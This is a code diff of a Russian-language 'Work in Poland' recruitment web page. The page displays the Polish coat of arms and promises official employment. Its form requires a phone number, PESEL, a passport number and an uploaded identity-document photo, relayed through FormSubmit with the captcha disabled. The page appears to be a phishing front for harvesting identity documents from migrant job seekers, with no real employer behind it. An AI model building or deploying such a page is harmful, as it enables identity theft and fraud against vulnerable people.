@@ -3,95 +3,40 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Работа в Польше — Рекрутинг</title>
+  <title>Работа в Польше</title>
 
   <style>
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #ffffff, #f2f5f9);
+      background: #f4f6f9;
       color: #333;
     }
 
     header {
-      background: #ffffff;
+      background: white;
       text-align: center;
-      padding: 30px 20px;
-      border-bottom: 4px solid #dc143c;
+      padding: 25px 15px;
+      border-bottom: 4px solid #d6001c;
     }
 
     header img {
       width: 90px;
+      height: auto;
       margin-bottom: 10px;
     }
 
     header h1 {
       margin: 10px 0 5px;
-      color: #111;
+      font-size: 26px;
     }
 
     header p {
+      margin: 0;
       color: #555;
     }
 
-    .container {
-      max-width: 650px;
-      margin: 40px auto;
-      background: white;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 6px 25px rgba(0,0,0,0.08);
-      border-top: 5px solid #dc143c;
-    }
-
-    form {
-      display: flex;
-      flex-direction: column;
-    }
-
-    input {
-      padding: 14px;
-      margin-bottom: 15px;
-      font-size: 15px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-    }
-
-    input:focus {
-      border-color: #dc143c;
-      outline: none;
-    }
-
-    button {
-      padding: 14px;
-      background: #dc143c;
-      color: white;
-      font-size: 16px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-weight: bold;
-    }
-
-    button:hover {
-      background: #a80f2a;
-    }
-
-    .info {
-      text-align: center;
-      margin-top: 15px;
-      font-size: 14px;
-      color: #666;
-    }
-
-    footer {
-      text-align: center;
-      padding: 20px;
-      font-size: 13px;
-      color: #777;
-    }
-
-    .bg-icons {
+    .bg {
       position: fixed;
       top: 0;
       left: 0;
@@ -102,17 +47,76 @@
       background-size: cover;
       z-index: -1;
     }
+
+    .container {
+      max-width: 650px;
+      margin: 40px auto;
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.08);
+      border-top: 5px solid #d6001c;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+
+    input {
+      padding: 14px;
+      margin-bottom: 12px;
+      font-size: 15px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+
+    input:focus {
+      border-color: #d6001c;
+      outline: none;
+    }
+
+    button {
+      padding: 14px;
+      background: #d6001c;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    button:hover {
+      background: #a80016;
+    }
+
+    .info {
+      text-align: center;
+      font-size: 14px;
+      color: #666;
+      margin-top: 15px;
+    }
+
+    footer {
+      text-align: center;
+      font-size: 13px;
+      color: #777;
+      padding: 20px;
+    }
   </style>
 </head>
 
 <body>
 
-<div class="bg-icons"></div>
+<div class="bg"></div>
 
 <header>
-  <img src="https://upload.wikimedia.org/wikipedia/commons/0/0f/Coat_of_arms_of_Poland-official.svg" alt="Герб Польши">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/0/0f/Coat_of_arms_of_Poland-official.svg" 
+       alt="Герб Польши"
+       onerror="this.style.display='none'">
   <h1>Работа в Польше</h1>
-  <p>Официальное трудоустройство через проверенного рекрутера</p>
+  <p>Официальное трудоустройство через рекрутера</p>
 </header>
 
 <div class="container">
@@ -123,16 +127,12 @@
 
     <input type="tel" name="phone" placeholder="Номер телефона" required />
 
-    <input type="text" name="pesel" placeholder="Номер PESEL" required />
+    <input type="text" name="pesel" placeholder="PESEL" required />
 
     <input type="text" name="passport" placeholder="Номер паспорта" required />
 
-    <label style="margin-bottom:5px; font-size:14px; color:#555;">
-      Фото документа удостоверяющего личность
-    </label>
-    <input type="file" name="document_photo" accept="image/*,.pdf" required />
+    <input type="file" name="document" accept="image/*,.pdf" required />
 
-    <!-- FormSubmit настройки -->
     <input type="hidden" name="_subject" value="Новая заявка — Работа в Польше">
     <input type="hidden" name="_captcha" value="false">
 
@@ -140,14 +140,14 @@
   </form>
 
   <div class="info">
-    Мы помогаем с официальным трудоустройством в Польше. Ответ в течение 24 часов.
+    Мы подбираем официальную работу в Польше. Ответ в течение 24 часов.
   </div>
 
 </div>
 
 <footer>
-  © 2026 Польша. Все права защищены.
+  © 2026  Польша (ытест версия)
 </footer>
 
 </body>
-</html>s
+</html>
